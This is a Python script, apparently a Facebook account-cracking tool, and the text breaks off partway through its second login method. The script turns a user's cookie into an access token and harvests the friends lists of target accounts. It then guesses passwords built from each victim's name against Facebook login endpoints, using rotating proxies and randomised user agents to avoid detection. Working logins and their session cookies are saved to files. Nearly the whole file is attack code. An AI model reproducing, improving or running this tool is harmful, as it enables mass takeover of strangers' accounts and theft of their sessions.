#----------[ IMPORT-MODULE ]----------#
import re,os,sys,rich,bs4,time, json,urllib3,base64,random,datetime,requests
from bs4 import BeautifulSoup as sop
from rich.console import Console as sol
from rich import print as prints
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as tred
from rich import pretty
from rich.tree import Tree
from rich.table import Table
from rich.text import Text as tekz
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.markdown import Markdown as mark

#----------[ GLOBAL-NAME ]----------#
pretty.install()
id2,uid=[],[]
proxxy,ugen=[],[]
dump,id,akun=[],[],[]
method,tokenku=[],[]
pwpluss,pwnya=[],[]
loop,ok,cp=0,0,0
CON=sol()
console=Console()
ses=requests.Session()

#----------[ GET-PROXY ]----------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(proxy)
except Exception as e:
    proxy=open('.prox.txt','r').read().splitlines()
    
#----------[ USER-AGENT ]----------#	
for nge_strings in range(10000):	
	a='Mozilla/5.0 (Linux; Android'
	aa=random.randrange(1, 9)
	bb=random.randrange(1, 9)
	dev=random.choice(['SAMSUNG SM-M136B','SC-04J','Air1','CPH2419','9137W','SAMSUNG SM-A326K/KSU3AUJ1','Multilaser_GMax_2','motorola edge 30 ultra','SC-02L','HTC U12'])
	b='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/'
	c=random.randrange(73,100)
	d='0'
	e=random.randrange(4200,4900)
	f=random.randrange(40,150)
	g='Mobile Safari/537.36'
	string_ua=f'{a} {aa}.{bb}; {dev}) {b}{c}.{d}.{e}.{f} {g}'
	ugen.append(string_ua)
	
for nge_strings in range(10000):	
	a='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6.1.0','7.0.1','8.1.0','10','11','12','13'])
	dev=random.choice(['es-us','ru-ru','ar-eg','id-id','de-de','zh-cn','en-us'])
	nul=random.choice(['7','8','9','10'])
	c='Redmi Note'
	m='Pro Build/'
	cuv=random.choice(["QP1A.190711.020","QKQ1.200114.002","TP1A.220624.014","RP1A.200720.011","SP1A.210812.016","PPR1.180610.011"])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
	string_ua=f'{a} {b}; {dev}; {c} {nul} {cuv}; wv){d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(string_ua)

#--------[ GENERATE-USER-AGENT ]----------#
for eksdi in range(10):
	a=random.choice(['7','8','9','10','11','12','13'])
	b=random.choice(['7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
x = '\33[m' # DEFAULT

#----------[ CONVERTER-BULAN ]----------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

#----------[ GARIS-KERAS ]----------#
def kopi(): 
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	
#----------[ KESALAHAN ]----------#	       
def help():
	krek_cer(f"\x1b[1;93m└──\x1b[1;97m[\x1b[1;91m•\x1b[1;97m] pilih yg bener bro :-(")
	login() 

#----------[ MACHINE-SUPPORT ]----------#		
def krek_cer(berjalan):
        for krek_cer in berjalan + "\n":sys.stdout.write(krek_cer);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
	
#----------[ BANNER ]----------#	
def banner():
	clear()
	print(f'''\t{mer}
  _________   _____ _____________________
 /   _____/  /     \\______   \_   _____/
 \_____  \  /  \ /  \|    |  _/|    __)  
 {puti}/        \/    Y    \    |   \|     \   
/_______  /\____|__  /______  /\___  /   
        \/         \/       \/     \/    
        {hijo} SIMPLE MULTI BRUTE FORCE''')
    	
#----------[ NGECEK COOKIES ]----------#
def login():
	try:
		token = open('.cyxieontoken.txt','r').read()
		cok = open('.cyxieoncokies.txt','r').read()
		tokenku.append(token)
		try:
			gass = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			krek = json.loads(gass.text)['id']
			fesbuk = json.loads(gass.text)['name']
			menu(krek,fesbuk)
		except KeyError:
			login_lagi()
		except requests.exceptions.ConnectionError:
			krek_cer(f'{kun}└──{x}[{mer}•{x}]{mer} Koneksi Anda Bermasalah :-( ');exit()
	except IOError:
		login_lagi()
		
#----------[ LOGIN-COOKIES ]----------#		
def login_lagi():
	try:
		os.system('clear');banner()
		kopi()
		your_cookies = input(f'{kun}└──{x}[{hijo}•{x}] Masukan Cookies {hijo}: ')
		with requests.Session() as r:
			try:
				r.headers.update({
				'content-type': 'application/x-www-form-urlencoded',
				})
				data = {
				'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01',
				'scope': ''}
				response = json.loads(r.post(
				'https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = (
				'https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
				})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					krek_cer(f"{kun}└──{x}[{mer}•{x}]{mer} Cookies Anda Invalid :-(", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search(
					'name="fb_dtsg" value="(.*?)"', 
					str(response2)).group(1)
					jazoest = re.search(
					'name="jazoest" value="(\d+)"', 
					str(response2)).group(1)
					data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'qr': 0,'user_code': user_code,}
					r.headers.update({
					'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
					})
					response3 = r.post(
					'https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop(
						'content-type');r.headers.pop(
						'origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search(
						'action="(.*?)"', 
						str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search(
						'name="fb_dtsg" value="(.*?)"', 
						str(response4)).group(1)
						jazoest = re.search(
						'name="jazoest" value="(\d+)"', 
						str(response4)).group(1)
						scope = re.search(
						'name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search(
						'name="display" value="(.*?)"', 
						str(response4)).group(1)
						user_code = re.search(
						'name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search(
						'name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search(
						'name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search(
						'name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search(
						'name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({
						'origin': 'https://m.facebook.com','referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
						})
						data = {
						'fb_dtsg': fb_dtsg,
						'jazoest': jazoest,
						'scope': scope,
						'display': display,
						'user_code': user_code,
						'logger_id': logger_id,
						'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,
						'return_format[]': return_format,}
						response5 = r.post(
						'https://m.facebook.com{}'.format(action), data = data, cookies = {
						'cookie': your_cookies}).text
						windows_referer = re.search(
						'window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop(
						'content-type');r.headers.pop('origin')
						r.headers.update({
						'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
							})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"{kun}└──{x}[{hijo}•{x}] Token {hijo}: {access_token}")
							tokenew = open(".cyxieontoken.txt","w").write(access_token)
							cook= open(".cyxieoncokies.txt","w").write(your_cookies)
							print(f"{kun}└──{x}[{hijo}•{x}] Login Berhasil Jalankan Ulang Python Simpel.py");exit()
			except Exception as e:
				krek_cer(f"{kun}└──{x}[{mer}•{x}]{mer} Login gagal cek tumbal lo ngab :-(")
				os.system('rm -rf .cyxieoncokies.txt && rm -rf .cyxieontoken.txt');print(e);time.sleep(3)
				back()
	except:pass
	
#----------[ BAGIAN-MENU ]----------#
def menu(id,name):
	try:
		token = open('.cyxieontoken.txt','r').read()
		cok = open('.cyxieoncokies.txt','r').read()
	except IOError:
		print('[•] Cookies Kadaluarsa ')
		time.sleep(3)
		login_lagi()
	os.system('clear')
	banner()
	kopi()
	print(f'{kun}└──{x}[{hijo}•{x}] Username : {hijo}{name} ')
	print(f'{kun}└──{x}[{hijo}•{x}] User  Id : {hijo}{id} ')
	kopi()
	print(f'{kun}└──{x}[{hijo}01{x}] Crack Publik ')
	print(f'{kun}└──{x}[{hijo}02{x}] Cek Result ')
	print(f'{kun}└──{x}[{mer}00{x}] Hapus Cookies ')
	kopi()
	_Gass_nge_krek_ = input(f'{kun}└──{x}[{hijo}•{x}] Input : ')
	kopi()
	if _Gass_nge_krek_ in ['1','01']:
		krek_publik()
	elif _Gass_nge_krek_ in ['2','02']:
		cek_result()
	elif _Gass_nge_krek_ in ['0','00']:
		os.system('rm -rf .cyxieoncokies.txt && rm -rf .cyxieontoken.txt')
		krek_cer(f'{kun}└──{x}[{mer}•{x}]{mer} Suckses hapus cookies');back()
	else:
		help()

#----------[ CRACK-PUBLIK ]----------#
def krek_publik():
	try:
		token = open('.cyxieontoken.txt','r').read()
		cok = open('.cyxieoncokies.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{kun}└──{x}[{hijo}•{x}] Berapa Target : '))
	except ValueError:
		help()
	if jum<1 or jum>100:
	    krek_cer(f'{kun}└──{x}[{mer}•{x}]{mer} Gagal Dump Idz ');back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f"{kun}└──{x}[{hijo}•{x}] Idz Target Ke "+str(yz)+f"{hijo} : ")
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			krek_cer(f'{kun}└──{x}[{mer}•{x}]{mer} Cek Sinyal Lo Ngab :-(')
	try:
		print(f'{kun}└──{x}[{hijo}•{x}] Total Idz Target {hijo}'+str(len(id)))
		atur_ter()
	except requests.exceptions.ConnectionError:
		krek_cer(f'{kun}└──{x}[{mer}•{x}]{mer} Cek Sinyal Lo Ngab :-(')
	except (KeyError,IOError):
		krek_cer(f'{kun}└──{x}[{mer}•{x}]{mer} Pertemanan Tidak Publik ');time.sleep(2);back()
				
#----------[ CEK-RESULT ]----------#
def cek_result():
	print(f'{kun}└──{x}[{hijo}•{x}] Hasil OK ')
	print(f'{kun}└──{x}[{hijo}•{x}] Hasil CP ')
	kopi()
	kz = input(f'{kun}└──{x}[{hijo}•{x}] Input : ')
	kopi()
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			krek_cer(f'{kun}└──{x}[{mer}•{x}] File tidak di temukan ');time.sleep(2);back()
		if len(vin)==0:
			print(f'{kun}└──{x}[{mer}•{x}] Anda tidak memiliki hasil Cp ');time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{kun}└──{x} %s. %s ({kun} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			kopi()
			geeh = input(f'{kun}└──{x}[{hijo}•{x}] Pilih : ')
			kopi()
			try:geh = lol[geeh]
			except KeyError:
				help()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				krek_cer(f'{kun}└──{x}[{mer}•{x}] File tidak di temukan ');time.sleep(2);back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{kun}└── {kun}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			kopi()
			input(f'{kun}└── [{hijo} Klik Enter {kun}]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			krek_cer(f'{kun}└──{x}[{mer}•{x}] File tidak di temukan ');time.sleep(2);back()
		if len(vin)==0:
			print(f'{kun}└──{x}[{mer}•{x}] Anda tidak memiliki hasil Ok ');time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{kun}└──{x} %s. %s ( {hijo}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{kun}└──{x} %s. %s ({hijo} %s {x}Idz )'%(cih,isi,(len(hem))))
			kopi()
			geeh = input(f'{kun}└──{x}[{hijo}•{x}] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				help()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				krek_cer(f'{kun}└──{x}[{mer}•{x}] File tidak di temukan ');time.sleep(2);back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{kun}└── {hijo}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			kopi()
			input(f'{kun}└── {x}[{hijo} Klik Enter {x}]')
			back()
	elif kz in ['3']:
		back()
	else:
		help()								
						
#----------[ MENU-IDZ ]----------#		
def atur_ter():
	kopi()
	print(f'{kun}└──{x}[{hijo}01{x}] Idz Tua ')
	print(f'{kun}└──{x}[{hijo}02{x}] Idz Muda ')
	print(f'{kun}└──{x}[{hijo}03{x}] Idz Random ')
	kopi()	
	krek_idz = input(f'{kun}└──{x}[{hijo}•{x}] Input Idz : ')
	if krek_idz in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif krek_idz in ['2','02']:
		muda=[]
		for gas_idz in sorted(id):
			muda.append(gas_idz)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif krek_idz in ['3','03']:
		for gas_idz in id:
			moga_old = random.randint(0,len(id2))
			id2.insert(moga_old,gas_idz)
	else:
		help()
		
#----------[ MENU-METODE ]----------#
	kopi()
	print(f'{kun}└──{x}[{hijo}01{x}] Mobile ')
	print(f'{kun}└──{x}[{hijo}02{x}] Mbasic ')
	print(f'{kun}└──{x}[{hijo}03{x}] Asyinc ')
	print(f'{kun}└──{x}[{hijo}04{x}] Mbeta ')
	kopi()
	Url_nge_krek = input(f'{kun}└──{x}[{hijo}•{x}] Input Url : ')
	if Url_nge_krek in ['1','01']:
		method.append('mobile')
	elif Url_nge_krek in ['2','02']:
		method.append('mbasic')
	elif Url_nge_krek in ['3','03']:
		method.append('asyinc')
	elif Url_nge_krek in ['4','04']:
		method.append('mbeta')
	else:
		method.append('mobile')
	passwrd()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwrd():
	global prog,des
	kopi()
	print(f'{kun}└──{x}[{hijo}•{x}] MAINKAN MODE PESAWAT SETIAP 300 IDZ ')
	print(f'{kun}└─────────────────────────────────────────────{x}\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'321')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'321')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
				    pool.submit(metod1,idf,pwv)
				elif 'mbasic' in method:
				    pool.submit(metod2,idf,pwv)
				elif 'asyinc' in method:
				    pool.submit(metod3,idf,pwv)
				elif 'mbeta' in method:
				    pool.submit(metod4,idf,pwv)
				else:
				    pool.submit(metod1,idf,pwv)
				    
	kopi()
	print(f'{kun}└──{x}[{hijo}•{x}] OK {hijo}: %s'%(ok))
	print(f'{kun}└──{x}[{hijo}•{x}] CP {kun}: %s'%(cp))

#----------[ METODE-VALIDATE ]----------#	
def metod1(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[green]m.facebook.com[white] {loop}/{len(id)} OK-:[green]{ok}[/] CP-:[yellow]{cp}[/]")
	prog.advance(des) 
	ua = random.choice(ugen)
	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="{str(rr(8,99))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('╭────────────────────────────╮')
				tree = Tree('')
				tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				print('╰────────────────────────────╯')
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print('╭────────────────────────────╮')
				tree = Tree("")
				tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
				tree.add(f'{hijo}{kuki}{x}').add(f'{mer}{ua}{x}')
				print('╰────────────────────────────╯')
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-MBASIC ]----------#	
def metod2(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[green]mbasic.facebook.com[white] {loop}/{len(id)} OK-:[green]{ok}[/] CP-:[yellow]{cp}[/]")
	prog.advance(des) 
	ua = random.choice(ugen)
	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%